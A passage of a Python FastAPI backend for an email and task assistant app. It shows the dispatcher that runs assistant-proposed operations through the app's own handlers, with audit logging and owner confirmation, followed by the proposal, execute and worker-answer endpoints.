        return {'field': field, 'value': value, **taught}
    # THE APP ITSELF, BY NAME (the assistant-runs-the-app design, 2026-09-18). Each handler runs the road
    # the tab's own button runs and audits as the assistant; the receipt says what it did (no undo - the owner, 2026-10-19).
    if kind in ('report.run', 'report.pause', 'report.resume', 'report.route', 'report.edit', 'report.delete'):
        src = store.get_source(tid)
        if not src or src.get('Channel') != 'report': raise HTTPException(404, 'no such report')
        cfg = json.loads(src.get('ConfigJson') or '{}') or {}
        title = cfg.get('title') or src.get('Address')
        if kind == 'report.run':
            from . import remote_assistant
            out = _rerun_report(tid, asked=remote_assistant.asking(), by='assistant')
            return {**out, 'title': title}
        if kind in ('report.pause', 'report.resume'):
            on = kind == 'report.resume'
            store.save_source({'SourceId': tid, 'Active': int(on)}, ACTOR)
            store.audit('source', tid, 'resume' if on else 'pause', 'assistant', detail={'title': title})
            return {'title': title, 'active': on}
        if kind == 'report.route':
            # one line of the route card - the same card the Reports page edits (the owner, 2026-09-27)
            from .reports import full_route, route_words, set_line
            line = str(p.get('line') or '').strip().lower()
            try: new = set_line(cfg, line, str(p.get('how') or '').strip().lower(), str(p.get('when') or ''),
                                str(p.get('rule') or '').strip().lower(), p.get('count'), str(p.get('text') or ''))
            except ValueError as e: raise HTTPException(422, str(e))
            prev = full_route(cfg)[line]
            store.save_source({'SourceId': tid, 'ConfigJson': json.dumps(new)}, ACTOR)
            store.audit('source', tid, 'route', 'assistant', detail={'title': title, 'line': line, 'from': prev, 'to': new['route'][line]})
            return {'title': title, 'route': route_words(new)}
        if kind == 'report.edit':
            patch = p.get('config') if isinstance(p.get('config'), dict) else {}
            if not patch: raise HTTPException(422, 'say what to change - config is the keys to change')
            if 'title' in patch and not str(patch['title'] or '').strip(): raise HTTPException(422, 'a report needs a title')
            new = {**cfg, **patch}
            store.save_source({'SourceId': tid, 'ConfigJson': json.dumps(new)}, ACTOR)
            store.audit('source', tid, 'edit', 'assistant', detail={'title': title, 'changed': sorted(patch)})
            return {'title': new.get('title') or title, 'changed': sorted(patch)}
        out = delete_source(tid)                       # the page's own Remove: kept under Recently deleted, with Restore
        store.audit('source', tid, 'delete', 'assistant', detail={'title': title})
        return {'title': title, 'deleted': out.get('deleted') or True}
    if kind == 'setting.set':
        from . import settings_schema
        key, meta = str(p.get('setting') or '').strip(), settings_schema.knobs().get(str(p.get('setting') or '').strip())
        if not meta: raise HTTPException(422, f'{key or "that"} is not a setting the schema knows')
        raw, t = p.get('value'), meta.get('type')
        v = str(raw if raw is not None else '').strip()
        if t == 'switch': v = '1' if v.lower() in ('1', 'true', 'on', 'yes') else '0' if v.lower() in ('0', 'false', 'off', 'no') else None
        elif t == 'number':
            if settings_schema.refuse(key, v): v = None         # '--5', 'nan', 'inf', -5 get the same sentence as 'often'
            elif v: n = float(v); v = str(int(n)) if n.is_integer() else str(n)   # 0.6 stays 0.6; blank is the default
        elif t == 'select': v = v if v in [str(o) for o in (meta.get('options') or [])] else None
        if v is None: raise HTTPException(422, f"{meta['label']} takes {'on or off' if t == 'switch' else 'a number, 0 or more' if t == 'number' else 'one of ' + ', '.join(str(o) for o in meta.get('options') or [])} - not {raw!r}")
        prev = store.get_setting(key)
        store.set_setting(key, v, ACTOR)
        store.audit('setting', 0, 'set', 'assistant', detail={'key': key, 'from': prev, 'to': v})
        said = settings_schema.describe(key, v)
        return {'key': key, 'label': meta['label'], 'value': v, 'said': said}
    if kind in ('connection.test', 'connection.pause', 'connection.resume'):
        c = store.get_connector(tid)
        if not c: raise HTTPException(404, 'connector not found')
        name = c.get('Name') or c.get('Type')
        if kind == 'connection.test':
            from .channels import test_connector
            out = test_connector(store, tid)
            store.audit('connector', tid, 'test_ok' if out.get('ok') else 'test_failed', 'assistant', detail=out.get('detail'))
            if not out.get('ok'): _failed_test(tid, name, out)
            # `answered`, not `ok`: a test that heard nothing still RAN - ok=False made it a failed act, and the owner was
            # told "the action did not complete" instead of what the connection said (2026-09-29 audit)
            return {'name': name, 'answered': bool(out.get('ok')), 'detail': out.get('detail')}
        on = kind == 'connection.resume'
        store.save_connector({'ConnectorId': tid, 'Active': int(on)}, ACTOR)
        store.audit('connector', tid, 'resume' if on else 'pause', 'assistant', detail={'name': name})
        return {'name': name, 'active': on}
    if kind == 'script.start':
        return {'script': str(p.get('name') or '')}
    if kind == 'task.complete':
        # the same close the PATCH road does: the pending draft is dismissed and the agent on it is stopped
        from . import concierge
        if not store.get_task(tid): raise HTTPException(404, 'task not found')
        # what came of work done off the app - "I called him" - is the close-out itself, so it is written on the task
        note = str(p.get('note') or '').strip()[:4000]
        if note: store.add_comment(tid, ACTOR, 'human', f'Closed out: {note}')
        # ...and whether a reply drafted for a yes went unsent with it - the receipt says so, never a bare "closed" (F24)
        rv = store.pending_review(tid, live_only=False) or {}
        unsent = str(rv.get('Kind') or '') in ('draft', 'draft_reply', 'reply', 'slot')
        return {'status': 'done', 'already': not concierge.close_task(store, tid, ACTOR), **({'unsent': True} if unsent else {})}
    if kind == 'task.reopen':
        if not store.get_task(tid): raise HTTPException(404, 'task not found')
        # ONE REOPEN (T13): back in progress, and an old Remind me date cleared - it reopened straight into Upcoming
        store.update_task(tid, {'Status': 'open', 'RemindAt': ''}, ACTOR); return {'status': 'open'}
    # THE TASK PAGE AS TOOLS (2026-09-25): each is the page's own handler, so the card and the click agree
    if kind == 'task.update':
        from .processing_order import known, level
        want = {'Priority': str(p.get('priority') or '').lower() or None, 'Title': str(p.get('title') or '').strip()[:200] or None}
        if want['Priority'] and not known(want['Priority']):
            raise HTTPException(422, f"priority is regular, important or urgent - not {p.get('priority')!r}")
        if want['Priority']: want['Priority'] = level(want['Priority'])      # an older word (high, normal, low) lands on its new one
        # A STRICT CONTRACT (concierge.task_contract): a value off it is refused with the allowed ones, never guessed
        # ...and the due day (B18, 2026-10-11): the late line's "Move the due day" had no road - triage was the only writer of it
        from . import concierge, remind
        try: c = concierge.task_contract(store, kind, tid, p)
        except ValueError as e: raise HTTPException(422, str(e))
        # ...and '' is the page's "unassigned" (assignee none): nobody holds it, a change like any other
        if 'assignee' in c: want['Assignee'] = c['assignee']
        want, day = {k: v for k, v in want.items() if v is not None}, c.get('due')
        due = day is not None
        if not want and not due: raise HTTPException(422, 'say what to change - priority, title, who owns it or the due day')
        if want: update_task(tid, TaskBody(**want), background)
        if due: remind.set_due(store, tid, day, ACTOR); want['DueAt'] = day or 'none'
        return {'taskId': tid, 'changed': want}
    if kind == 'task.set_repo': return set_task_repo(tid, RepoBody(repo=str(p.get('repo') or '').strip() or None), background)
    if kind == 'task.check':
        from . import concierge
        try: hit = concierge.task_contract(store, kind, tid, p)['item']
        except ValueError as e: raise HTTPException(422, str(e))
        if p.get('note') is not None:
            store.note_checklist_item(tid, hit['id'], str(p['note']), ACTOR)
            if p.get('done') is None: return {'taskId': tid, 'item': hit['text'], 'note': str(p['note'])}
        on = str(p.get('done', True)).lower() not in ('false', '0', 'no')
        out = tick_checklist(tid, hit['id'], ChecklistTick(done=on))
        return {**(out if isinstance(out, dict) else {}), 'item': hit['text'], 'done': on}
    if kind == 'task.checklist':
        from . import slots
        items, emails, drop = p.get('items'), p.get('emails'), p.get('drop')
        if p.get('add') and not isinstance(items, list):
            add = p['add'] if isinstance(p['add'], list) else [p['add']]
            new = store.merge_task_checklist(tid, [str(x) for x in add], ACTOR)
            if not emails and not drop: return {'taskId': tid, 'checklist': store.task_checklist(tid), 'added': len(new)}
        if not isinstance(items, list) and not emails and not drop: raise HTTPException(422, 'say the new list (items), emails to add or emails to drop')
        # plain items and emails are edited apart: a reworded list never deletes an email by leaving it out
        if isinstance(items, list): store.set_task_checklist(tid, [str(x) for x in items] + [i['text'] for i in slots.all_(store, tid)], ACTOR)
        added = slots.add(store, tid, emails, ACTOR) if emails else []
        gone = {str(x).strip().casefold() for x in (drop or [])}
        for i in slots.open_(store, tid):
            if str(i['out'].get('to')).casefold() in gone: slots.drop(store, tid, i['id'], ACTOR)
        return {'taskId': tid, 'checklist': store.task_checklist(tid), 'added': len(added)}
    if kind == 'task.comment':
        comment(tid, TextBody(body=str(p.get('text') or '').strip()))
        return {'taskId': tid}
    if kind == 'task.handoff':
        from . import concierge
        t = store.get_task(tid)
        if not t: raise HTTPException(404, 'task not found')
        msgs = store.list_messages(tid)
        try: return concierge.forward_item(store, {'tid': tid, 'mid': msgs[-1]['MessageId'] if msgs else None, 'title': t.get('Title'),
                                                    'who': msgs[-1].get('FromName') if msgs else None, 'key': f'task:{tid}'},
                                           str(p.get('who') or ''), str(p.get('note') or ''), ACTOR)
        except ValueError as e: raise HTTPException(422, str(e))
    if kind == 'task.merge':
        import re as _re
        into = _re.search(r'(\d+)', str(p.get('into') or ''))
        if not into: raise HTTPException(422, 'name the task it is the same job as (TQ-0123)')
        return merge_task_api(tid, MergeBody(into=int(into.group(1))))
    # ...the message the page asked about when it names one (its "Ask the sender" answers the mail on screen, not the newest)
    if kind == 'task.clarify':
        return clarify_with_sender(tid, ClarifyBody(body=str(p.get('text') or ''), message_id=int(p['message_id']) if str(p.get('message_id') or '').isdigit() else None))
    # the owner vouching for a stranger's task (origin.raise_to) - a page press only: not in toolcatalog.PURPOSE, so no chat can vouch
    if kind == 'task.trust': return task_trust(tid, str(p.get('scope') or ''))
    if kind == 'agent.continue': return continue_work(tid, ContinueBody(note=str(p.get('note') or '') or None))
    if kind == 'review.reject': return decide(tid, DecideBody(verb='reject'), background)
    if kind == 'hub.publish':
        from . import handbook
        return handbook.post(store, str(p.get('title') or ''), str(p.get('body') or ''), str(p.get('topic') or ''),
                             str(p.get('kind') or 'new_idea'), 'assistant', None, clip=True, why_earned=str(p.get('why_earned') or ''))
    if kind == 'task.watch':
        from . import asks
        try: return asks.watch_task(store, tid, p.get('what') or 'any')
        except ValueError as e: raise HTTPException(422, str(e))
    if kind == 'task.defer':
        from . import remind
        try: return remind.set_reminder(store, tid, p.get('until'), ACTOR)
        except ValueError as e: raise HTTPException(409 if isinstance(e, remind.AgentOpen) else 422, str(e))
    # the assistant's proposals (concierge.PROPOSALS): each runs the same code the page's own button runs
    if kind == 'task.create_from_text':
        from . import concierge
        return concierge.handoff_task(store, str(p.get('text') or ''), str(p.get('kind') or 'coding'), ACTOR, title=p.get('title'),
                                      repo=str(p.get('repo') or '') or None, profile=str(p.get('profile') or '') or None)
    if kind == 'task.setup':
        from . import concierge
        return concierge.setup_task(store, str(p.get('text') or ''), ACTOR, title=str(p.get('title') or ''))
    if kind == 'message.archive': return file_message(mid, NotATaskBody(learn=False, archive=True), background)
    if kind == 'preference.exclude_sender': return not_mine(mid, NotMineBody(scope=str(p.get('scope') or 'sender')), background)
    # the bigger hammer, down the SAME road the card's own button took (ignore_sender, how='rule')
    if kind == 'preference.sender_rule': return ignore_sender(mid, IgnoreSenderBody(how='rule'), background)
    # the bigger hammer, down the SAME road the card's own button took (ignore_sender, how='rule')
    if kind == 'preference.sender_rule': return ignore_sender(mid, IgnoreSenderBody(how='rule'), background)
    if kind == 'calendar.prepare':
        # the meeting card's Prepare, from the row, the phone or a lit chip: the event as the rail holds it (funnel.calendar_items)
        from . import funnel
        key = str(p.get('key') or ''); item = funnel.next_item(store, key, include_surfaced=True) or funnel.item_for_key(store, key)
        e = (item or {}).get('event')
        if not e: raise HTTPException(404, 'that meeting is not on the rail any more')
        return calendar_prepare(MeetingPrepBody(**{k: e.get(k) for k in ('subject', 'start', 'end', 'where', 'organizer', 'about')},
                                                who=[w for w in e.get('who') or [] if w], link=e.get('join'),
                                                instruction=str(p.get('text') or '') or None), background)
    if kind == 'calendar.answer':
        # THE CALENDAR'S ANSWERS, by words (a phone chat; on the desk the words only light the row's button): drafted, never sent - a
        # new time with none named is the first free one the row's picker would offer, there to change before Send
        from . import calwrite
        m = store.get_message(mid)
        if not m: raise HTTPException(404, 'that message is gone')
        act, start, end = str(p.get('act') or ''), p.get('start'), p.get('end')
        if act in ('propose', 'schedule') and not (start and end):
            free = calwrite.slots_for(store, m, act)['slots']
            if not free: raise HTTPException(422, 'there is no free time in those days - pick one on the row')
            start, end = free[0]['start'], free[0]['end']
        try: return calwrite.draft(store, mid, act, start, end, ACTOR)
        except calwrite.NoAccess as e: raise outbound.Fixable(str(e), e.fix['label'], e.fix['href'])
    if kind in ('task.chase', 'task.let_go', 'task.elsewhere'):
        # THE SLIPPED ANSWERS (spec 2026-10-12): each is an outcome. The item is the rail's card (a person's step, or a thread with
        # a follow-up on it); the person is its `who_email`, the ledger's key. A chase is a draft for your yes, never a send.
        import json as _json
        from . import assistant, funnel, outcomes
        key = str(p.get('key') or ''); item = funnel.next_item(store, key, include_surfaced=True) or funnel.item_for_key(store, key)
        if not item: raise HTTPException(404, 'that one is not on the rail any more')
        # ...and only while it IS slipped: pressed after they wrote back, or on a card that never slipped, nothing is changed
        # ...or a Chase the rule lit on a wait past its day (rulebook.adds) - it answers the thread rulebook.chase_thread names
        from . import rulebook
        ct = rulebook.chase_thread(store, item) if kind == 'task.chase' and item.get('lane') != 'forgotten' and rulebook.adds(store, item) == ['chase'] else None
        if item.get('lane') != 'forgotten' and not ct: raise HTTPException(409, 'That one is not slipped any more - they wrote back, or it moved on. Nothing was changed.')
        who, tid_, iid, text = str(item.get('who_email') or ''), item.get('tid'), item.get('idea'), str(p.get('text') or '').strip()[:300]
        if ct: who, tid_ = ct['who'], ct['tid']
        task_ = store.get_task(tid_) if tid_ else None
        step = bool(task_ and str(task_.get('Assignee') or '').startswith('person:') and task_.get('Status') not in ('done', 'dropped'))   # a step somebody owes
        if kind == 'task.chase':
            # the thread's last word FROM THE PERSON WHO OWES IT: a follow-up's own inbound, or the step's conversation filtered by them
            a = item.get('action') or {}
            if ct: mid = ct['mid']
            elif a.get('type') == 'followup' and a.get('mid'): mid = a['mid']
            else:
                row = store._one("SELECT MessageId FROM message WHERE TaskId=? AND lower(FromEmail)=? AND Status!='context' ORDER BY SentAt DESC LIMIT 1",
                                 (tid_, who)) if tid_ and who else None                      # the step's own mail from them
                mid = (row or {}).get('MessageId')
            if not mid and not ct: raise HTTPException(422, 'There is no thread with them to chase on - write to them from the task page, and the ledger will count it.')
            n = (sum(1 for r in outcomes.rows_for(store, 'task', tid_) if _json.loads(r.get('FactsJson') or '{}').get('chase')) if tid_ else 0) + 1
            cc = outcomes.chase_cc(store, who) if who else None
            instr = f'a short chase to {who or "them"}, in my voice: no answer yet, what I need and by when' + (f'; copy {cc}, who gets them to answer' if cc else '')
            if ct and not mid:
                # nothing of theirs on it to answer: a new message to them from the task, waiting for the owner's yes like any draft
                from . import outbox
                try: got = outbox.task_email(store, tid_, who, instr, cc=[cc] if cc else None, actor=ACTOR)
                except ValueError as e: raise HTTPException(422, str(e))
                store._exec('UPDATE review SET Reason=? WHERE ReviewId=?', (f'chase:{n}' + (f' cc:{cc}' if cc else ''), got['review_id']))
                return {'reviewId': got['review_id'], 'taskId': tid_, 'draft': got['draft'], 'drafting': not got['draft'], 'cc': cc}
            if a.get('type') == 'followup': out = open_reply(mid, OpenReplyBody(instruction=instr, app_words=True))     # their thread: its newest line is theirs
            else:
                # a step somebody owes: the review answers THEIR last word, even when somebody else wrote on the thread since -
                # open_reply would re-target to the newest line, and the chase would go to the wrong person
                from . import responder
                rv = store.pending_review(tid_) if tid_ else None
                rid = rv['ReviewId'] if rv and rv.get('MessageId') == mid else store.add_review({'TaskId': tid_, 'MessageId': mid, 'Kind': 'draft', 'Status': 'pending', 'Reason': f'chase:{n}'})
                try: draft = responder.write_draft(store, tid_, rid, actor=ACTOR, nudge=instr)
                except Exception as e: logger.warning(f'chase draft on {task_ref(tid_)} not written: {e}'); draft = ''
                out = {'reviewId': rid, 'taskId': tid_, 'draft': draft, 'drafting': not draft}
            store._exec('UPDATE review SET Reason=? WHERE ReviewId=?', (f'chase:{n}' + (f' cc:{cc}' if cc else ''), out['reviewId']))
            return {**out, 'cc': cc}
        # Let it go is a turn-down on the follow-up; answered elsewhere is a done. Only a step somebody OWES is dropped or closed -
        # a thread's own task is never touched for its follow-up (the review, 2026-10-12)
        if iid: assistant.act(store, iid, 'dismiss' if kind == 'task.let_go' else 'done', ACTOR)
        status = 'put down'
        if step and kind == 'task.let_go':
            store.add_comment(tid_, ACTOR, 'human', 'Let it go - nobody is chasing this further.'); store.update_task(tid_, {'Status': 'dropped'}, ACTOR); status = 'dropped'
        elif step:
            store.add_comment(tid_, ACTOR, 'human', f"Answered elsewhere{': ' + text if text else ''}."); store.update_task(tid_, {'Status': 'done'}, ACTOR); status = 'done'
        outcomes.record(store, 'chase.let_go' if kind == 'task.let_go' else 'chase.elsewhere', 'task' if tid_ else 'message', tid_ or item.get('mid') or 0, ACTOR,
                        facts={'who': who, **({'where': text} if text else {})})
        return {'status': status, 'who': who}
    if kind == 'item.settle':
        from . import funnel, verdicts
        verb = str(p.get('verb') or 'done')
        out = funnel.settle(store, str(p.get('key')), verb, ACTOR, p.get('hours'),
                            expected_context=p.get('processing_context'))
        # "done" on a task-backed item IS Mark done - the one close (concierge.close_task): drafts retired, the agent
        # stopped, off the rail. It used to close the task and leave its agent running (the owner, 2026-09-24).
        if verb == 'done' and p.get('tid'):
            from . import concierge
            rv = store.pending_review(int(p['tid']), live_only=False) or {}
            if concierge.close_task(store, int(p['tid']), ACTOR):
                out['closed'] = int(p['tid'])
                if str(rv.get('Kind') or '') in ('draft', 'draft_reply', 'reply', 'slot'): out['unsent'] = True      # (F24)
        return out
    if kind == 'review.approve':
        if not store.get_review(tid): raise HTTPException(404, 'review not found')
        # a close-out's yes carries the reply waiting beside it - the chat's and the phone's one "Close out"
        from . import proposals
        rv = store.get_review(tid)
        closeout = rv.get('Kind') == 'action' and proposals._action(rv) in proposals.CLOSEOUT
        out = decide(tid, DecideBody(verb='approve', reply_text='' if closeout else None, anyway=bool(p.get('anyway'))), background)
        # ...with what the failure knows about the way on - GitHub's own offers (Update branch, Re-run checks) and a grant the
        # token lacks - which the chat and the phone draw as its choices (concierge.recover); a bare RuntimeError dropped both
        if not out.get('ok'):
            raise operations.Halt(out.get('send_error') or 'the reply was not sent',
                                  {k: out[k] for k in ('offers', 'refused', 'needs') if out.get(k)} | {'rid': tid}
                                  | ({'fix': out['send_fix']} if out.get('send_fix') else {}))
        # A REPLY THAT DID NOT LEAVE IS NOT DONE (2026-09-29): the verdict comes back ok with the review still pending and the
        # error in send_error - a send that threw, or one the provider never answered - and that was receipted "Done" and
        # settled off the walk. A close-out whose merge landed but whose reply failed did happen; it says so beside it.
        if out.get('status') == 'pending' and out.get('send_error'):
            # ...with its fix: dropped here, a send confirmed in chat with no mailbox never offered Connect a mailbox (2026-10-18)
            raise operations.Halt(out['send_error'], {'delivery': out.get('delivery') or 'failed', 'unsent': True, 'rid': tid}
                                  | ({'fix': out['send_fix']} if out.get('send_fix') else {}))
        if out.get('send_error'): out = {**out, 'reply_error': out['send_error']}
        return out
    if kind == 'agent.answer':
        # the exact outstanding request of the run that asked (PW-138/139); nothing asked = the waiting room (PW-140)
        from . import workerstate as ws
        # ...in the owner's words, never a "yes" made up for them (B12, 2026-10-11): an empty answer reached a permission
        # prompt as yes, and "which branch?" as the word yes
        said = ' '.join(str(p.get('text') or '').split())
        if not said: raise ValueError('say what to tell the agent')
        out = ws.answer_open(store, tid, said, ACTOR)
        if out['state'] == 'no_request': return waitroom_add(tid, {'text': said})
        if not out['delivered']: raise RuntimeError(f"{out['state']}: {out.get('why') or ''}")
        return out
    # the page's "Stop and save" (TasksView.wrapUp posts close=False): the agent ends, the task stays
    if kind == 'agent.stop': return _wrap_task(tid, False) if p.get('wrap') else stop_task_agent(tid)
    if kind == 'report.rerun':
        from . import remote_assistant
        return _rerun_report(tid, asked=remote_assistant.asking(), by='assistant')
    if kind == 'memory.remember':
        from . import concierge, memoryedit
        # ...a fact about how the owner works with someone or something goes where its readers read it (LEARNED.md), and closes the line
        # it makes untrue; any other fact is a saved note, as it always was
        if p.get('about') or p.get('section') or p.get('replaces'):
            try: return {'learned': memoryedit.remember(store, str(p.get('note') or ''), str(p.get('about') or ''), str(p.get('section') or ''),
                                                        str(p.get('replaces') or ''))}
            except LookupError as e: raise HTTPException(404, f"{e} The line to replace was not found - read memory.about for its key.")
            except ValueError as e: raise HTTPException(422, str(e))
        return {'memoryId': concierge.remember_fact(store, str(p.get('note') or ''), ACTOR)}
    if kind == 'memory.wrong':
        from . import memoryedit
        how = str(p.get('how') or 'wrong').strip().lower()
        try: return memoryedit.close(store, str(p.get('key') or '')) | {'how': 'ended'} if how == 'ended' else memoryedit.mark(store, str(p.get('key') or ''), how)
        except LookupError as e: raise HTTPException(404, str(e))
        except ValueError as e: raise HTTPException(409, str(e))
    if kind == 'people.relate':
        from . import orgchart
        try: return orgchart.relate(store, p.get('who'), p.get('relation'), p.get('owns'), p.get('drops'), bool(p.get('forget')), ACTOR)
        except ValueError as e: raise HTTPException(422, str(e))
    if kind == 'task.split' and isinstance(p.get('second'), dict):
        # the task page's Split (Reshape): both halves as the owner wrote them and the mails that go with the second - the page's own handler
        return split_task_api(tid, TaskSplitBody(second=SplitHalf(**p['second']), first=SplitHalf(**p['first']) if isinstance(p.get('first'), dict) else None,
                                                 move_message_ids=[int(x) for x in p.get('move_message_ids') or []]))
    if kind == 'task.split':
        from . import concierge, funnel
        item = (funnel.next_item(store, p['key']) if p.get('key') else None) or {'tid': tid, 'key': p.get('key')}
        return concierge.split_item(store, item, str(p.get('text') or ''), ACTOR)
    # SORT IT AGAIN and SEND OUT RESULTS as tools (2026-10-18): each runs the page's own handler - the row's retriage, the task
    # bar's Email someone - so a card and a click agree. The second only drafts: it waits in Close out for the owner's yes
    if kind == 'message.retriage': return retriage_message(mid)
    if kind == 'task.ask_agent': return task_reason_ask(tid, {'to': p.get('who'), 'text': p.get('text')})
    if kind == 'task.share':
        from . import concierge
        who = (concierge.person(store, str(p.get('who') or '')) or {}).get('Email')
        if not who: raise HTTPException(422, f"no address for {p.get('who') or 'nobody'} - say their email address")
        return task_email(tid, TaskEmailBody(to=who, about=str(p.get('about') or '')))
    if kind == 'report.create':
        # the same road the Reports tab takes (validate, then save_source) - never an assistant-only path (PW-194)
        from . import compose
        cfg = dict(p.get('config') or {})
        ok, why = compose.validate(store, cfg)
        if not ok: raise RuntimeError(why)
        title = str(cfg.get('title') or '').strip()
        if any(x.get('Channel') == 'report' and str(x.get('Address') or '').casefold() == title.casefold() for x in store.list_sources(active_only=False)):
            raise RuntimeError(f'a report named {title!r} already exists - open it under Reports')
        enabled = bool(p.get('enabled', True))
        out = save_source(SourceBody(Channel='report', Address=title, Active=enabled, ConfigJson=json.dumps(cfg)))
        return {**out, 'title': title, 'type': cfg.get('type'), 'enabled': enabled, 'link': f"#report={out['sourceId']}"}
    if kind == 'connection.create':
        # the same road the Connections tab takes; a secret never rides a proposal, and the card stays off until authorized (PW-196)
        from . import concierge
        typ, name = str(p.get('type') or ''), str(p.get('name') or '')
        cfg = {k: v for k, v in (p.get('config') or {}).items() if not concierge.SECRET_WORDS.search(str(k))}
        body = (ConnectorBody(ConnectorId=tid, ConfigJson=json.dumps(cfg) if cfg else None, Scope=p.get('scope') or None) if tid
                else ConnectorBody(Type=typ, Name=name, ConfigJson=json.dumps(cfg) if cfg else None, Scope=p.get('scope') or None, Active=False))
        out = save_connector(body)
        c = store.get_connector(out['connectorId'], with_secret=True) or {}
        state = ('authorization pending' if not c.get('Secret') else 'connected' if c.get('LastSyncAt') and not c.get('LastError')
                 else 'validation failed' if c.get('LastError') else 'saved, not yet verified')
        return {'connectorId': out['connectorId'], 'type': c.get('Type') or typ, 'name': c.get('Name') or name, 'state': state,
                'active': bool(c.get('Active')), 'link': f"#connector={out['connectorId']}"}
    if kind == 'role.apply':
        # the same road the Profiles page's Set up takes (roles.apply) - the chat walked the owner to it
        from . import roles
        # the SERVER's config (the one put_agent saves): `cfg` is a local name further down this function
        return roles.apply(store, globals()['cfg'], str(p.get('role') or ''), str(p.get('portal') or ''), bool(p.get('route_mail')))
    if kind == 'pipe.clear':
        from . import concierge
        # a SELECTOR names the set - the model's, checked by select_items - and nothing else clears: a word list matching the
        # owner's sentence used to sweep whatever it hit (2026-10-08: "all these should not exist as hard coded rules")
        if not p.get('select'): raise HTTPException(422, 'name the set to clear (select) - nothing was cleared')
        return concierge.clear_selected(store, p['select'], ACTOR)
    if kind in ('pipe.defer', 'pipe.close'):
        from . import concierge
        if not p.get('select'): raise HTTPException(422, 'name the set (select) - nothing was changed')
        try: return (concierge.defer_selected(store, p['select'], p.get('until'), ACTOR) if kind == 'pipe.defer'
                     else concierge.close_selected(store, p['select'], ACTOR))
        except ValueError as e: raise HTTPException(422, str(e))
    raise HTTPException(501, f'{kind} has no shared handler yet')

@app.post('/api/operations/{oid}/preview')
def preview_operation(oid: str):
    """A dry run of a proposed report (PW-195): read-only, files nothing, sends nothing, activates nothing, starts nothing."""
    from . import scopes
    op = operations.get(store, oid)
    if not op or op['kind'] != 'report.create': raise HTTPException(404, 'nothing to preview')
    cfg = dict((op['params'] or {}).get('config') or {})
    if scopes.needs(cfg.get('type')) != 'read':
        raise HTTPException(422, f"{cfg.get('type')} writes to a system - a dry run could too; run it from Reports once created")
    for k in ('deliver', 'alert', 'triage', 'on_startup', 'cron', 'every_minutes', 'daily_at'): cfg.pop(k, None)
    return report_preview(cfg)

@app.post('/api/operations')
def propose_operation(body: OperationBody):
    try: return operations.propose(store, body.kind, body.target, body.params, ACTOR)
    except ValueError as e: raise HTTPException(422, str(e))

@app.get('/api/operations/{oid}')
def get_operation(oid: str):
    op = operations.get(store, oid)
    if not op: raise HTTPException(404, 'no such proposal')
    return op

@app.patch('/api/operations/{oid}')
def edit_operation(oid: str, body: OperationEdit):
    try: return operations.revise(store, oid, body.params, ACTOR)
    except ValueError as e: raise HTTPException(404 if 'no such' in str(e) else 422, str(e))

@app.delete('/api/operations/{oid}')
def cancel_operation(oid: str):
    try: return operations.cancel(store, oid, ACTOR)
    except ValueError as e: raise HTTPException(404, str(e))

@app.post('/api/operations/{oid}/execute')
def execute_operation(oid: str, body: OperationConfirm, background: BackgroundTasks):
    """The confirmation button: the structured proposal, by id and version - never a phrase sent back
    through an interpreter. Stale or cancelled is 409 with the reason; a failed handler is reported as
    such; a repeated click is the first receipt again (PW-124, PW-125)."""
    op = operations.get(store, oid)
    if not op: raise HTTPException(404, 'no such proposal')
    from . import concierge
    try: table = concierge.on_table(store, op)            # read before it runs: a close takes the item off the table
    except Exception as e:
        logger.debug(f'on_table failed for {oid}: {e}'); table = False
    out = operations.execute(store, oid, body.version, lambda: _run_operation(op, background), ACTOR)
    # the receipt is the fact of what happened, in the chat, after it happened (PW-125)
    # ...and the page shows THAT line, not a shorter one of its own beside it (two "Done"s per click)
    # ...and when it did not happen, its way on (concierge.recover): the choices ride under that line
    try:
        turn = concierge.receipt_turn(store, out, ACTOR, table=table, press=True)
        out = {**out, 'receipt': turn['say'], 'chips': turn['chips']}
        # ...and a press on the table's task view lands in the chat now, not on its next 30-second read (Stream B, 2026-10-18)
        if table: live_bus.emit(live_bus.CHAT)
    except Exception as e: logger.debug(f'no receipt recorded for {oid}: {e}')
    # ...and a press on a proposal that moved or was cancelled answers with that line and its buttons, so the page shows the one
    # recorded receipt with its way on - the bare 409 had the page write a second line of its own, "Say it again", and only Next
    if out['status'] in ('stale', 'cancelled'):
        return JSONResponse({'detail': out.get('error') or out['status'], 'status': out['status'], 'receipt': out.get('receipt'),
                             'chips': out.get('chips') or [], 'op': operations.get(store, oid)}, status_code=409)
    return out

@app.get('/api/tasks/{task_id}/history')
def task_history(task_id: int):
    if not store.get_task(task_id): raise HTTPException(404, 'task not found')
    return {'data': operations.history(store, task_id=task_id)}

@app.get('/api/messages/{mid}/history')
def message_history(mid: int):
    if not store.get_message(mid): raise HTTPException(404, 'message not found')
    return {'data': operations.history(store, message_id=mid)}

@app.post('/api/tasks/{task_id}/discussion')
def task_discuss(task_id: int, body: DiscussBody):
    if not store.get_task(task_id): raise HTTPException(404, 'task not found')
    try: return {'id': operations.discuss(store, body.actor, body.body, task_id=task_id)}
    except ValueError as e: raise HTTPException(422, str(e))

@app.post('/api/messages/{mid}/discussion')
def message_discuss(mid: int, body: DiscussBody):
    if not store.get_message(mid): raise HTTPException(404, 'message not found')
    try: return {'id': operations.discuss(store, body.actor, body.body, message_id=mid)}
    except ValueError as e: raise HTTPException(422, str(e))


# ── the worker's own word on its state (workerstate.py) ────────────────────────────────────────
class WorkerAnswerBody(BaseModel): request_id: str; text: str
class WorkerAnswersBody(BaseModel): answers: dict

@app.get('/api/tasks/{task_id}/worker')
def worker_status(task_id: int):
    """Working, input needed (the question), approval needed (the action), finished (the result), failed,
    disconnected, stopped - or unknown; derived from explicit events, never from the screen (PW-222/226)."""
    if not store.get_task(task_id): raise HTTPException(404, 'task not found')
    from . import workerstate as ws
    return ws.status(store, task_id)

@app.post('/api/tasks/{task_id}/worker/answer')
def worker_answer(task_id: int, body: WorkerAnswerBody):
    """Deliver an answer to ONE outstanding request of the run that asked it (PW-139/141): once; 409 when it is
    resolved already or the run changed; 422 when there is no live worker or delivery failed."""
    if not store.get_task(task_id): raise HTTPException(404, 'task not found')
    from . import workerstate as ws
    try: out = ws.answer(store, task_id, body.request_id, body.text, ACTOR)
    except ValueError as e: raise HTTPException(422, str(e))
    if not out['delivered']:
        raise HTTPException(409 if out['state'] in ('resolved', 'stale') else 422, f"{out['state']}: {out.get('why') or ''}")
    return out


@app.post('/api/tasks/{task_id}/worker/answers')
def worker_answers(task_id: int, body: WorkerAnswersBody):
    """ALL the answers to one ask, together (request_id -> words) - a coding agent's three questions go back as one, the
    way its form takes them (workerstate.answer_group). "noted" while a held ask still waits on the rest."""
